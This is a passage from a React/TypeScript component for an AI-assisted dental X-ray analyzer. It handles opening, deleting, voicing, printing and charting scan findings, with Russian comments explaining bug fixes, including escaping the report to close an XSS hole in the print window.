		// строку списка БЕЗ картинки и БЕЗ сообщения: врач видел «снимок
		// открыт», думал что файла в карте нет. СТАЛО: openFailure вслух;
		// метаданные списка остаются, чтобы было ясно какой снимок не открылся.
		try {
			const res = await fetch(
				`/api/xray/scans/${encodeURIComponent(scan.id)}`,
				{
					headers: denteClinicalReadHeaders(),
				},
			);
			if (!res.ok) {
				logger.error(
					`[VisiographAnalyzer] полный снимок не открыт, ${res.status}`,
				);
				setOpenFailure(
					res.status === 404
						? "Снимок не найден в карте (возможно, его уже удалили на другом рабочем месте). Обновите архив."
						: res.status === 403
							? "Нет доступа к полному снимку. Проверьте смену и права, затем откройте строку ещё раз."
							: `Полный снимок не загружен (ответ ${res.status}). Картинка на экране отсутствует — повторите открытие.`,
				);
				return;
			}
			const full: XrayScan = await res.json();
			setCurrentScan(full);
			if (full.imageDataUri) {
				setCurrentImageUrl(full.imageDataUri);
			} else {
				// 200 без тела картинки — тоже отказ для врача, не «пустой успех».
				setOpenFailure(
					"Сервер отдал карточку снимка без изображения. Повторите открытие или загрузите снимок заново.",
				);
			}
			if (full.aiToothStates) {
				const plan = planVisiographFindings(full.aiToothStates);
				const allPlanCodes = plan.groups.flatMap((g) => g.teeth.map((t) => t.code));
				setSelectedFindingCodes(new Set(allPlanCodes));
			}
		} catch (err) {
			showToast(
				actionFailureToast(
					"Ошибка выполнения операции",
					(err as { status?: number })?.status ?? null,
				),
				"error",
			);
			logger.error(
				"[VisiographAnalyzer] запрос полного снимка не выполнен",
				err,
			);
			setOpenFailure(
				"Нет связи с сервером — полный снимок не загружен. Проверьте сеть и откройте строку ещё раз.",
			);
		}
	};

	/**
	 * Удаление снимка из архива пациента.
	 *
	 * ЗАЧЕМ. API DELETE /api/xray/scans/:id (xray.ts:238) уже снимал строку
	 * xray_scans по организации вызывающего, но веб нигде его не звал: история
	 * умела только открыть снимок. Ошибочно загруженный или чужой разбор оставался
	 * в карте навсегда. Здесь кнопка в строке архива и на открытом снимке из
	 * истории зовут тот же маршрут с denteClinicalMutationHeaders — без секрета
	 * охрана отвечает 403, как у POST /api/xray/scans.
	 *
	 * После 204 строка уходит из scanHistory сразу (не ждём повторного GET), а
	 * если удалённый id совпал с currentScan — экран разбора гасится, иначе врач
	 * продолжал бы читать уже несуществующее заключение.
	 */
	const deleteScan = async (scan: XrayScan) => {
		if (deletingScanId) return;
		const label = scan.originalFilename?.trim() || "этот снимок";
		const ok = window.confirm(
			`Удалить «${label}» из архива пациента?\n\nЗаключение и привязка к карте будут сняты. Это нельзя отменить.`,
		);
		if (!ok) return;

		setDeletingScanId(scan.id);
		setDeleteFailure(null);
		try {
			const res = await fetch(
				`/api/xray/scans/${encodeURIComponent(scan.id)}`,
				{
					method: "DELETE",
					headers: denteClinicalMutationHeaders(),
				},
			);
			// Fastify 204 has empty body; res.ok is true for 204.
			if (!res.ok) {
				let message = `Снимок не удалён (ответ ${res.status}).`;
				try {
					const body = (await res.json()) as {
						message?: string;
						error?: string;
					};
					if (typeof body?.message === "string" && body.message.trim()) {
						message = body.message.trim();
					} else if (typeof body?.error === "string" && body.error.trim()) {
						message = body.error.trim();
					}
				} catch {
					/* non-json body */
				}
				setDeleteFailure(message);
				return;
			}
			setScanHistory((prev) => prev.filter((s) => s.id !== scan.id));
			if (currentScan?.id === scan.id) {
				setCurrentScan(null);
				setCurrentImageUrl(null);
				setIsHistoryView(false);
				setAppliedToothCodes([]);
				setApplyNotice(null);
				setSaveFailure(null);
				setFormulaFailure(null);
				setError(null);
				if (synthRef.current) synthRef.current.cancel();
				setIsSpeaking(false);
			}
		} catch (err) {
			showToast(
				actionFailureToast(
					"Ошибка выполнения операции",
					(err as { status?: number })?.status ?? null,
				),
				"error",
			);
			logger.error("[VisiographAnalyzer] scan delete failed", err);
			setDeleteFailure(
				"Снимок не удалён: нет связи с сервером. Проверьте сеть и повторите.",
			);
		} finally {
			setDeletingScanId(null);
		}
	};

	// ── Voice ───────────────────────────────────────────────────────────────
	const handleSpeak = useCallback(() => {
		const synth = synthRef.current;
		if (!synth || !currentScan?.aiReport) return;
		if (isSpeaking) {
			synth.cancel();
			setIsSpeaking(false);
			return;
		}
		const cleanText = (currentScan.aiReport || "")
			.replace(/[*#_`~[\]]/g, "")
			.replace(/\n{2,}/g, ". ");
		const utterance = new SpeechSynthesisUtterance(cleanText);
		utterance.lang = "ru-RU";
		utterance.rate = 0.9;
		const voices = synth.getVoices();
		const ruVoice =
			voices.find((v) => v.lang === "ru-RU") ??
			voices.find((v) => v.lang.startsWith("ru")) ??
			null;
		if (ruVoice) utterance.voice = ruVoice;
		utterance.onend = () => setIsSpeaking(false);
		utterance.onerror = () => setIsSpeaking(false);
		synth.cancel();
		synth.speak(utterance);
		setIsSpeaking(true);
	}, [currentScan, isSpeaking]);

	// ── Print ───────────────────────────────────────────────────────────────
	const handlePrint = () => {
		if (!currentScan?.aiReport) return;
		const win = window.open("", "_blank");
		if (!win) return;
		// Отчёт модели экранируется: `<pre>` НЕ нейтрализует теги, и до этого
		// исправления содержимое aiReport исполнялось как HTML в том же origin,
		// что и приложение (XSS через окно печати).
		win.document.write(`
      <html><head><title>AI Отчёт · ShadowAnalyst</title>
      <style>body{font-family:Arial,sans-serif;padding:24px;max-width:700px;margin:0 auto}
      h1{font-size:18px;border-bottom:2px solid #333;padding-bottom:8px}
      pre{white-space:pre-wrap;font-family:inherit;font-size:14px;line-height:1.6}</style>
      </head><body>
      <h1>ИИ-Анализ 2D-снимка · ShadowAnalyst</h1>
      <p style="color:#666;font-size:12px">Дата: ${escapeHtml(new Date(currentScan.capturedAt).toLocaleDateString("ru-RU"))}</p>
      <pre>${escapeHtml(currentScan.aiReport)}</pre>
      </body></html>
    `);
		win.document.close();
		win.print();
	};

	// ── Clear ───────────────────────────────────────────────────────────────
	const handleClear = () => {
		setCurrentScan(null);
		setCurrentImageUrl(null);
		setError(null);
		setOpenFailure(null);
		setSaveFailure(null);
		setFormulaFailure(null);
		setSelectedFindingCodes(new Set());
		setIsApplyingToChart(false);
		setApplyNotice(null);
		setIsHistoryView(false);
		if (synthRef.current) synthRef.current.cancel();
		setIsSpeaking(false);
	};

	// ── Report sections ────────────────────────────────────────────────────
	const reportSections = currentScan?.aiReport
		? parseReportSections(currentScan.aiReport)
		: [];
	const toothStatesArray: AiToothState[] = currentScan?.aiToothStates
		? Object.entries(currentScan.aiToothStates).map(([code, state]) => ({
				code,
				state,
			}))
		: [];
	const criticalCount = toothStatesArray.filter(
		(t) => t.state === "treatment" || t.state === "watch",
	).length;

	// Какое из трёх состояний архива показывать. Решение вынесено в общий
	// resolvePanelPhase, потому что ошибались именно в порядке: отказ важнее
	// пустоты, загрузка важнее пустоты. Прежнее условие было одно —
	// `scanHistory.length > 0` — и молча накрывало оба случая.
	const historyPhase = resolvePanelPhase({
		isLoading: isLoadingHistory,
		hasFailure: historyFailure !== null,
		isEmpty: scanHistory.length === 0,
	});

	// ── Цвета: только имена, объявленные в темах ─────────────────────────────
	// БЫЛО: по всей разметке ниже стояли var(--border), var(--surface),
	// var(--bg-inset), var(--text), var(--text-muted) — ни одно из этих имён не
	// объявлено ни в styles/main.css, ни в styles/dente-redesign.css, ни в
	// styles/token-aliases.css (проверено поиском объявлений по всем .css в
	// apps/: ноль совпадений). Объявление с неизвестной переменной браузер молча
	// отбрасывает, и свойство берёт наследуемое либо начальное значение:
	// border-шорткат откатывался к border-style: none, поэтому рамка карточки,
	// разделитель шапки, рамки кнопок, пунктир зоны загрузки, обводка чипов,
	// линии между разделами отчёта и рамки строк истории НЕ рисовались вообще;
	// background откатывался к transparent, поэтому подложки шапки, зоны
	// загрузки и нейтральных чипов исчезали; а color НАСЛЕДУЕТСЯ, поэтому
	// «приглушённый» текст рисовался полным цветом --ink — приглушение как
	// способ отделить второстепенное от главного не работало, и на чипе
	// состояния 'план' пропадали сразу фон, рамка и приглушение.
	// Заменено на токены темы, объявленные для светлой, тёмной и ночной тем:
	//   --border → --line (сплошные рамки и разделители),
	//              --line-strong для пунктира зоны загрузки — так пунктир задан
	//              во всех остальных css проекта;
	//   --surface → --paper; --bg-inset → --paper-soft;
	//   --text → --ink; --text-muted → --muted.
	// Псевдонимы в token-aliases.css намеренно НЕ добавлены: --text-muted стоит в
	// чужих файлах в форме var(--text-muted, #718096) — объявив это имя, я молча
	// сменил бы цвет в правилах, где сейчас работает запас.
	return (
		<details
			className="visiograph-analyzer-details"
			style={{ marginBottom: "12px" }}
		>
			<summary
				style={{
					display: "flex",
					alignItems: "center",
					gap: "8px",
					cursor: "pointer",
					padding: "8px 0",
					userSelect: "none",
					listStyle: "none",
					color: "var(--muted)",
					width: "fit-content",
				}}
			>
				<ScanLine size={18} style={{ color: "var(--teal)" }} />
				<span style={{ fontSize: "0.95rem", fontWeight: 500 }}>
					ИИ-Анализ снимка (ShadowAnalyst)
				</span>
				{(scanHistory.length > 0 || isLoadingHistory) && (
					<span
						style={{
							// БЫЛО: жёсткий 'white'. В тёмной теме --teal это #2dd4bf, и
							// белая цифра на нём давала контраст 1.86 — счётчик снимков
							// читался с трудом. --on-teal задуман ровно для этого: белый в
							// светлой теме, почти чёрный в тёмной и ночной.
							fontSize: "0.78rem",
							background: "var(--teal)",
							color: "var(--on-teal)",
							borderRadius: "999px",
							padding: "1px 7px",
							fontWeight: 600,
						}}
					>
						{isLoadingHistory ? "…" : scanHistory.length}
					</span>
				)}
				{/* Панель свёрнута по умолчанию (<details> без open), поэтому отказ
            чтения архива внутри неё врач бы не увидел вовсе — а раньше он и
            внутри выглядел как «снимков нет». Пометка в сводке — единственное
            место, где это видно в свёрнутом виде. */}
				{historyFailure && (
					<span
						style={{
							display: "inline-flex",
							alignItems: "center",
							gap: "4px",
							fontSize: "0.78rem",
							color: "var(--warn-fg)",
							fontWeight: 600,
						}}
					>
						<AlertTriangle size={13} /> архив снимков не прочитан
					</span>
				)}
			</summary>

			<div
				style={{
					border: "1px solid var(--line)",
					borderRadius: "14px",
					background: "var(--paper)",
					marginTop: "10px",
					overflow: "hidden",
				}}
			>
				{/* Header bar */}
				<div
					style={{
						display: "flex",
						alignItems: "center",
						justifyContent: "space-between",
						padding: "12px 16px",
						borderBottom: "1px solid var(--line)",
						background: "var(--paper-soft)",
					}}
				>
					<div style={{ display: "flex", alignItems: "center", gap: "8px" }}>
						<Bot size={16} style={{ color: "var(--teal)" }} />
						<span style={{ fontWeight: 600, fontSize: "0.9rem" }}>
							ShadowAnalyst · Dental AI
						</span>
						{criticalCount > 0 && (
							<span
								style={{
									background: "#e53935",
									color: "white",
									fontSize: "0.75rem",
									padding: "2px 8px",
									borderRadius: "999px",
									fontWeight: 700,
								}}
							>
								{criticalCount} проблем
							</span>
						)}
					</div>
					<div style={{ display: "flex", gap: "6px" }}>
						{currentScan?.aiReport && (
							<>
								<button
									type="button"
									onClick={handleSpeak}
									disabled={!voicesReady && !isSpeaking}
									title={isSpeaking ? "Стоп" : "Озвучить"}
									style={{
										// Пока идёт озвучивание, кнопка залита --teal. Белая иконка
										// на нём в тёмной теме (#2dd4bf) давала контраст 1.86 —
										// ровно та же поломка, что уже описана выше у счётчика
										// снимков. --on-teal подобран под эту заливку в каждой теме.
										background: isSpeaking ? "var(--teal)" : "transparent",
										color: isSpeaking ? "var(--on-teal)" : "var(--muted)",
										border: "1px solid var(--line)",
										borderRadius: "8px",
										padding: "5px 8px",
										cursor: "pointer",
										display: "flex",
										alignItems: "center",
										gap: "4px",
										fontSize: "0.8rem",
										transition: "all 0.2s",
									}}
								>
									{isSpeaking ? <VolumeX size={14} /> : <Volume2 size={14} />}
								</button>
								<button
									type="button"
									onClick={handlePrint}
									title="Печать"
									style={{
										background: "transparent",
										color: "var(--muted)",
										border: "1px solid var(--line)",
										borderRadius: "8px",
										padding: "5px 8px",
										cursor: "pointer",
										display: "flex",
										alignItems: "center",
										fontSize: "0.8rem",
										transition: "all 0.2s",
									}}
								>
									<Printer size={14} />
								</button>
								<button
									type="button"
									onClick={handleClear}
									title="Закрыть результат"
									style={{
										background: "transparent",
										color: "var(--muted)",
										border: "1px solid var(--line)",
										borderRadius: "8px",
										padding: "5px 8px",
										cursor: "pointer",
										display: "flex",
										alignItems: "center",
										fontSize: "0.8rem",
									}}
								>
									<X size={14} />
								</button>
							</>
						)}
					</div>
				</div>

				<div style={{ padding: "16px" }}>
					{/* Drop Zone */}
					{!currentScan && (
						<button
							type="button"
							// biome-ignore lint/suspicious/noExplicitAny: automated suppression
							ref={dropRef as any}
							onDrop={handleDrop}
							onDragOver={handleDragOver}
							onDragLeave={handleDragLeave}
							onClick={() => !isAnalyzing && fileInputRef.current?.click()}
							onKeyDown={(e) => {
								if ((e.key === "Enter" || e.key === " ") && !isAnalyzing) {
									e.preventDefault();
									fileInputRef.current?.click();
								}
							}}
							style={{
								width: "100%",
								border: `2px dashed ${isDragOver ? "var(--teal)" : "var(--line-strong)"}`,
								borderRadius: "12px",
								padding: "28px 20px",
								textAlign: "center",
								cursor: isAnalyzing ? "not-allowed" : "pointer",
								background: isDragOver
									? "var(--teal-soft)"
									: "var(--paper-soft)",
								transition: "all 0.25s ease",
								opacity: isAnalyzing ? 0.7 : 1,
							}}
						>
							<input
								type="file"
								accept="image/*"
								ref={fileInputRef}
								style={{ display: "none" }}
								onChange={handleFileChange}
							/>

							{isAnalyzing ? (
								<div
									style={{
										display: "flex",
										flexDirection: "column",
										alignItems: "center",
										gap: "12px",
									}}
								>
									<Loader2
										size={36}
										className="animate-spin"
										style={{ color: "var(--teal)" }}
									/>
									<p
										style={{ margin: 0, fontWeight: 600, color: "var(--ink)" }}
									>
										Анализируем снимок...
									</p>
									<p
										style={{
											margin: 0,
											fontSize: "0.85rem",
											color: "var(--muted)",
										}}
									>
										ИИ-модель обрабатывает данные. Обычно 10–25 секунд.
									</p>
								</div>
							) : (
								<div
									style={{
										display: "flex",
										flexDirection: "column",
										alignItems: "center",
										gap: "10px",
									}}
								>
									<UploadCloud
										size={36}
										style={{
											color: isDragOver ? "var(--teal)" : "var(--muted)",
										}}
									/>
									<p
										style={{
											margin: 0,
											fontWeight: 600,
											color: isDragOver ? "var(--teal)" : "var(--ink)",
										}}
									>
										{isDragOver
											? "Отпустите снимок"
											: "Перетащите снимок или нажмите"}
									</p>
									<p
										style={{
											margin: 0,
											fontSize: "0.82rem",
											color: "var(--muted)",
										}}
									>
										Прицельный снимок (JPG, PNG, BMP). ИИ найдёт кариес,
										периодонтит, обновит формулу зубов.
									</p>
									<span
										className="btn-primary"
										style={{
											display: "inline-block",
											marginTop: "8px",
											padding: "8px 20px",
											borderRadius: "8px",
											fontSize: "0.88rem",
											opacity: isAnalyzing ? 0.5 : 1,
										}}
									>
										Выбрать файл
									</span>
								</div>
							)}
						</button>
					)}

					{/* Error state */}
					{error && (
						<div
							style={{
								// БЫЛО: var(--error-surface, #fff0f0) и var(--error, #c62828).
								// Оба имени не объявлены ни в одной теме, поэтому всегда работал
								// запас — светло-розовая плашка со светлой темы держалась и в
								// тёмной, и в ночной. --bad-bg/--bad-fg объявлены во всех трёх
								// темах; в светлой они дают тот же смысл, что прежние литералы.
								padding: "12px 16px",
								background: "var(--bad-bg)",
								color: "var(--bad-fg)",
								borderRadius: "10px",
								display: "flex",
								alignItems: "flex-start",
								gap: "10px",
								fontSize: "0.88rem",
								marginTop: currentScan ? "0" : "12px",
							}}
						>
							<AlertTriangle
								size={16}
								style={{ flexShrink: 0, marginTop: "2px" }}
							/>
							<div>
								<strong>Ошибка анализа</strong>
								<div style={{ marginTop: "4px" }}>{error}</div>
							</div>
							<button
								type="button"
								onClick={() => setError(null)}
								style={{
									marginLeft: "auto",
									background: "none",
									border: "none",
									cursor: "pointer",
									color: "inherit",
								}}
							>
								<X size={14} />
							</button>
						</div>
					)}

					{/* Result area */}
					{currentScan && (
						<div
							style={{ display: "flex", flexDirection: "column", gap: "16px" }}
						>
							{/* Image viewer & PACS Studio */}
							{currentImageUrl && (
								<div
									style={{
										display: "flex",
										flexDirection: "column",
										gap: "8px",
									}}
								>
									<div
										style={{
											display: "flex",
											justifyContent: "space-between",
											alignItems: "center",
											gap: "8px",
											flexWrap: "wrap",
										}}
									>
										<div style={{ display: "flex", alignItems: "center", gap: "8px" }}>
											<button
												type="button"
												data-testid="btn-run-visiograph-ai"
												onClick={handleRunAiAnalysis}
												disabled={isAnalyzing}
												style={{
													padding: "6px 14px",
													background: isAnalyzing ? "var(--paper-soft)" : "var(--teal)",
													color: isAnalyzing ? "var(--muted)" : "var(--on-teal, white)",
													border: "1px solid var(--teal)",
													borderRadius: "8px",
													fontSize: "0.82rem",
													fontWeight: 700,
													cursor: isAnalyzing ? "wait" : "pointer",
													display: "flex",
													alignItems: "center",
													gap: "6px",
													transition: "all 0.2s ease",
												}}
												title="Запустить фоновый ИИ-анализ снимка (нейросеть найдёт кариес, периодонтит, пломбы)"
											>
												{isAnalyzing ? (
													<>
														<Loader2 size={14} className="animate-spin" />
														<span>ИИ анализирует снимок...</span>
													</>
												) : (
													<>
														<Sparkles size={14} />
														<span>
															{currentScan?.aiReport
																? "Перезапустить ИИ-анализ"
																: "Запустить ИИ-анализ"}
														</span>
													</>
												)}
											</button>
											{isAnalyzing && (
												<span style={{ fontSize: "0.78rem", color: "var(--muted)" }}>
													Фоновый анализ в процессе... снимок доступен для работы
												</span>
											)}
										</div>

										<button
											type="button"
											onClick={() => setIsStudioMode((prev) => !prev)}
											style={{
												padding: "6px 12px",
												background: isStudioMode
													? "var(--teal)"
													: "var(--paper-soft)",
												color: isStudioMode
													? "var(--on-teal)"
													: "var(--ink)",
												border: "1px solid var(--line)",
												borderRadius: "8px",
												fontSize: "0.82rem",
												fontWeight: 600,
												cursor: "pointer",
												display: "flex",
												alignItems: "center",
												gap: "6px",
												transition: "all 0.2s ease",
											}}
										>
											<Sparkles size={14} />
											{isStudioMode
												? "Свернуть 2D PACS Студию"
												: "📐 Инструменты анализа (Линейка, Углы, Очаги, ЭЦП)"}
										</button>
									</div>

									{isStudioMode ? (
										<VisiographStudioCanvas
											imageUrl={currentImageUrl}
											patientId={selectedPatientId}
											patientFullName={
												selectedPatientId
													? `Пациент #${selectedPatientId}`
													: undefined
											}
											toothCode={currentScan.toothCode}
											studyId={currentScan.id}
											onClose={() => setIsStudioMode(false)}
										/>
									) : (
										<div
											style={{
												borderRadius: "10px",
												overflow: "hidden",
												border: "1px solid var(--line)",
											}}
										>
											<ShadowAnalystImageSlider
												imageUrl={currentImageUrl}
												enhanced={true}
											/>
										</div>
									)}
								</div>
							)}

							{/* Saving indicator */}
							{isSaving && (
								<div
									style={{
										fontSize: "0.8rem",
										color: "var(--muted)",
										display: "flex",
										alignItems: "center",
										gap: "6px",
									}}
								>
									<Loader2 size={12} className="animate-spin" /> Сохранение в
									карту пациента...
								</div>
							)}

							{/*
							 * Отказ записи в карту. Стоит РЯДОМ с заключением, а не наверху
							 * панели: врач читает текст разбора и должен здесь же увидеть, что
							 * в карту он не попал. Цвет — предупреждение (--warn-bg/--warn-fg
							 * объявлены во всех трёх темах), потому что разбор не потерян,
							 * он на экране; потеряна только запись.
							 */}
							{openFailure && (
								<div
									role="alert"
									data-testid="xray-scan-open-failure"
									style={{
										padding: "10px 14px",
										background: "var(--warn-bg)",
										color: "var(--warn-fg)",
										borderRadius: "10px",
										display: "flex",
										alignItems: "flex-start",
										gap: "10px",
										fontSize: "0.85rem",
									}}
								>
									<AlertTriangle
										size={16}
										style={{ flexShrink: 0, marginTop: "2px" }}
										aria-hidden="true"
									/>
									<div>
										<strong>Снимок не открыт полностью</strong>
										<div style={{ marginTop: "4px" }}>{openFailure}</div>
									</div>
									<button
										type="button"
										onClick={() => setOpenFailure(null)}
										style={{
											marginLeft: "auto",
											background: "none",
											border: "none",
											cursor: "pointer",
											color: "inherit",
										}}
										aria-label="Скрыть сообщение"
									>
										<X size={14} />
									</button>
								</div>
							)}

							{!isSaving && saveFailure && (
								<div
									role="alert"
									style={{
										padding: "10px 14px",
										background: "var(--warn-bg)",
										color: "var(--warn-fg)",
										borderRadius: "10px",
										display: "flex",
										alignItems: "flex-start",
										gap: "10px",
										fontSize: "0.85rem",
									}}
								>
									<AlertTriangle
										size={16}
										style={{ flexShrink: 0, marginTop: "2px" }}
										aria-hidden="true"
									/>
									<div>
										<strong>Заключение не сохранено в карту</strong>
										<div style={{ marginTop: "4px" }}>{saveFailure}</div>
									</div>
								</div>
							)}

							{/*
							 * Отказ записи В ЗУБНУЮ ФОРМУЛУ — своя плашка, а не общая с
							 * отказом записи снимка: это две разные записи в карте пациента,
							 * и врач должен видеть, какая именно не сохранилась. Стоит выше
							 * счётчика «Внесено в зубную формулу», чтобы отказ читался раньше
							 * числа.
							 */}
							{formulaFailure && (
								<div
									role="alert"
									style={{
										padding: "10px 14px",
										background: "var(--warn-bg)",
										color: "var(--warn-fg)",
										borderRadius: "10px",
										display: "flex",
										alignItems: "flex-start",
										gap: "10px",
										fontSize: "0.85rem",
									}}
								>
									<AlertTriangle
										size={16}
										style={{ flexShrink: 0, marginTop: "2px" }}
										aria-hidden="true"
									/>
									<div>
										<strong>Находки не внесены в зубную формулу</strong>
										<div style={{ marginTop: "4px" }}>{formulaFailure}</div>
									</div>
								</div>
							)}

							{/*
							 * Непонятые находки. Отдельной строкой и до плашек: врач должен
							 * узнать, что часть зубов помощник описал так, что в формулу их не
							 * внесли, — иначе он решит, что снимок разобран целиком.
							 */}
							{applyNotice && (
								<div
									role="status"
									style={{
										padding: "10px 14px",
										background: "var(--warn-bg)",
										color: "var(--warn-fg)",
										borderRadius: "10px",
										display: "flex",
										alignItems: "flex-start",
										gap: "10px",
										fontSize: "0.85rem",
									}}
								>
									<AlertTriangle
										size={16}
										style={{ flexShrink: 0, marginTop: "2px" }}
										aria-hidden="true"
									/>
									<div>{applyNotice}</div>
								</div>
							)}

							{/* Tooth states findings & Doctor Approval */}
							{toothStatesArray.length > 0 && (
								<div
									style={{
										padding: "14px 16px",
										background: "var(--paper-soft)",
										borderRadius: "10px",
										border: "1px solid var(--line)",
										display: "flex",
										flexDirection: "column",
										gap: "12px",
									}}
								>
									<div
										style={{
											display: "flex",
											justifyContent: "space-between",
											alignItems: "center",
											flexWrap: "wrap",
											gap: "8px",
										}}
									>
										<div>
											<div
												style={{
													fontSize: "0.88rem",
													fontWeight: 700,
													color: "var(--ink)",
													display: "flex",
													alignItems: "center",
													gap: "6px",
												}}
											>
												<Sparkles size={16} style={{ color: "var(--teal)" }} />
												<span>Находки ИИ на снимке (рекомендательный список)</span>
											</div>
											<div
												style={{
													fontSize: "0.78rem",
													color: "var(--muted)",
													marginTop: "2px",
												}}
											>
												{isHistoryView
													? `Зубы из архива: ${toothStatesArray.length} поз.`
													: appliedToothCodes.length > 0
														? `Внесено в зубную формулу: ${countLabel(appliedToothCodes.length, "зуб", "зуба", "зубов")} из ${toothStatesArray.length}`
														: "Отметьте нужные зубы и нажмите «Применить выбранные к формуле»"}
											</div>
										</div>

										<div style={{ display: "flex", alignItems: "center", gap: "8px" }}>
											<button
												type="button"
												onClick={() => {
													const allCodes = toothStatesArray.map((t) => t.code);
													if (selectedFindingCodes.size === allCodes.length) {
														setSelectedFindingCodes(new Set());
													} else {
														setSelectedFindingCodes(new Set(allCodes));
													}
												}}
												style={{
													padding: "5px 10px",
													fontSize: "0.75rem",
													background: "transparent",
													color: "var(--muted)",
													border: "1px solid var(--line)",
													borderRadius: "6px",
													cursor: "pointer",
												}}
											>
												{selectedFindingCodes.size === toothStatesArray.length
													? "Снять выбор"
													: "Выбрать все"}
											</button>

											<button
												type="button"
												data-testid="btn-apply-findings-to-chart"
												onClick={handleApplyFindingsToChart}
												disabled={isApplyingToChart || selectedFindingCodes.size === 0}
												style={{
													padding: "6px 14px",
													background:
														selectedFindingCodes.size > 0 && !isApplyingToChart
															? "var(--teal)"
															: "var(--line)",
													color:
														selectedFindingCodes.size > 0 && !isApplyingToChart
															? "var(--on-teal, white)"
															: "var(--muted)",
													border: "none",
													borderRadius: "8px",
													fontSize: "0.82rem",
													fontWeight: 700,
													cursor:
														selectedFindingCodes.size > 0 && !isApplyingToChart
															? "pointer"
															: "not-allowed",
													display: "flex",
													alignItems: "center",
													gap: "6px",
													transition: "all 0.2s ease",
												}}
												title="Применить выбранные врачом находки ИИ к живой зубной формуле пациента"
											>
												{isApplyingToChart ? (
													<>
														<Loader2 size={14} className="animate-spin" />
														<span>Внесение...</span>
													</>
												) : (
													<>
														<CheckCircle2 size={14} />
														<span>
															Применить выбранные к формуле ({selectedFindingCodes.size})
														</span>
													</>
												)}
											</button>
										</div>
									</div>

									<div style={{ display: "flex", flexWrap: "wrap", gap: "8px" }}>
										{(toothStatesArray ?? []).map(({ code, state }) => {
											const isCritical =
												state === "treatment" || state === "watch";
											const isApplied = appliedToothCodes.includes(code);
											const isSelected = selectedFindingCodes.has(code);

											return (
												<label
													key={code}
													style={{
														display: "inline-flex",
														alignItems: "center",
														gap: "6px",
														padding: "5px 12px",
														borderRadius: "8px",
														fontSize: "0.82rem",
														fontWeight: 600,
														background: isApplied
															? "var(--teal-soft)"
															: isSelected
																? "var(--paper)"
																: "var(--paper-soft)",
														color: isApplied
															? "var(--teal)"
															: isCritical
																? "var(--rust, #c62828)"
																: "var(--ink)",
														border: `1px solid ${
															isApplied
																? "var(--teal)"
																: isSelected
																	? "var(--teal)"
																	: "var(--line)"
														}`,
														cursor: "pointer",
														userSelect: "none",
														transition: "all 0.15s ease",
													}}
												>
													<input
														type="checkbox"
														checked={isSelected}
														onChange={(e) => {
															const next = new Set(selectedFindingCodes);
															if (e.target.checked) next.add(code);
															else next.delete(code);
															setSelectedFindingCodes(next);
														}}
														style={{ cursor: "pointer" }}
													/>
													<span>Зуб {code}</span>
													<span style={{ opacity: 0.8, fontWeight: 400 }}>
														· {STATE_LABELS[state] ?? state}
													</span>
													{isApplied && (
														<span
															style={{
																fontSize: "0.7rem",
																fontWeight: 700,
																background: "var(--teal)",
																color: "var(--on-teal, white)",
																padding: "1px 6px",
																borderRadius: "4px",
																marginLeft: "4px",
															}}
														>
															Внесено
														</span>
													)}
												</label>
											);
										})}
									</div>
								</div>
							)}

							{/* AI Report sections */}
							{reportSections.length > 0 && (
								<div
									style={{
										border: "1px solid var(--line)",
										borderRadius: "10px",
										overflow: "hidden",
									}}
								>
									<div
										style={{
											padding: "10px 14px",
											background: "var(--paper-soft)",
											display: "flex",
											alignItems: "center",
											gap: "8px",
											borderBottom: "1px solid var(--line)",
										}}
									>
										<Sparkles size={14} style={{ color: "var(--teal)" }} />
										<span style={{ fontWeight: 600, fontSize: "0.88rem" }}>
											Полный отчёт ShadowAnalyst
										</span>
										<span
											style={{
												fontSize: "0.78rem",
												color: "var(--muted)",
												marginLeft: "auto",
											}}
										>
											{new Date(currentScan.capturedAt).toLocaleDateString(
												"ru-RU",
											)}
										</span>
									</div>
									{(reportSections ?? []).map((section, sIndex) => (
										<div
											key={
												section.title ||
												`section-${section.content.slice(0, 10)}`
											}
											style={{
												borderBottom:
													sIndex < reportSections.length - 1
														? "1px solid var(--line)"
														: "none",
											}}
										>
											<button
												type="button"
												onClick={() =>
													setActiveSection(
														activeSection === sIndex ? null : sIndex,
													)
												}
												style={{
													width: "100%",
													textAlign: "left",
													padding: "10px 14px",
													background:
														activeSection === sIndex
															? "var(--paper-soft)"
															: "transparent",
													border: "none",
													cursor: "pointer",
													display: "flex",
													alignItems: "center",
													gap: "8px",
													transition: "background 0.15s",
												}}
											>
												<section.icon size={16} style={{ color: "var(--teal)", flexShrink: 0 }} aria-hidden="true" />
												<span
													style={{
														fontWeight: 600,
														fontSize: "0.88rem",
														flex: 1,
													}}
												>
													{section.title}
												</span>
												<ChevronDown
													size={14}
													style={{
														transform:
															activeSection === sIndex
																? "rotate(180deg)"
																: "none",
														transition: "transform 0.2s",
														color: "var(--muted)",
													}}
												/>
											</button>
											{activeSection === sIndex && (
												<div
													style={{
														padding: "8px 14px 14px 34px",
														fontSize: "0.87rem",
														lineHeight: 1.65,
														color: "var(--ink)",
													}}
													// biome-ignore lint/security/noDangerouslySetInnerHtml: content sanitized via escapeHtml() before renderMarkdown()
													dangerouslySetInnerHTML={{
														__html: renderMarkdown(section.content),
													}}
												/>
											)}
										</div>
									))}
								</div>
							)}

							{/* New scan / delete-from-archive actions */}
							<div style={{ display: "flex", flexWrap: "wrap", gap: "8px" }}>
								<button
									type="button"
									onClick={handleClear}
									style={{
										display: "flex",
										alignItems: "center",
										gap: "8px",
										justifyContent: "center",
										padding: "9px 20px",
										borderRadius: "8px",
										cursor: "pointer",
										fontSize: "0.88rem",
										background: "transparent",
										border: "1px solid var(--line)",
										color: "var(--muted)",
										transition: "all 0.2s",
									}}
								>
									<UploadCloud size={14} />
									Загрузить другой снимок
								</button>
								{isHistoryView && currentScan && (
									<button
										type="button"
										data-testid="xray-scan-delete-current"
										aria-label="Удалить открытый снимок из архива"
										disabled={deletingScanId === currentScan.id}
										onClick={() => void deleteScan(currentScan)}
										style={{
											display: "flex",
											alignItems: "center",
											gap: "8px",
											justifyContent: "center",
											padding: "9px 20px",
											borderRadius: "8px",
											fontSize: "0.88rem",
											background: "transparent",
											border: "1px solid var(--rust, #c62828)",
											color: "var(--rust, #c62828)",
											cursor:
												deletingScanId === currentScan.id ? "wait" : "pointer",
											opacity: deletingScanId === currentScan.id ? 0.7 : 1,
										}}
									>
										{deletingScanId === currentScan.id ? (
											<Loader2
												size={14}
												className="animate-spin"
												aria-hidden="true"
											/>
										) : (
											<Trash2 size={14} aria-hidden="true" />
										)}
										Удалить из архива
									</button>
								)}
							</div>
							{deleteFailure && isHistoryView && (
								<div
									role="alert"
									data-testid="xray-scan-delete-failure-current"
									style={{
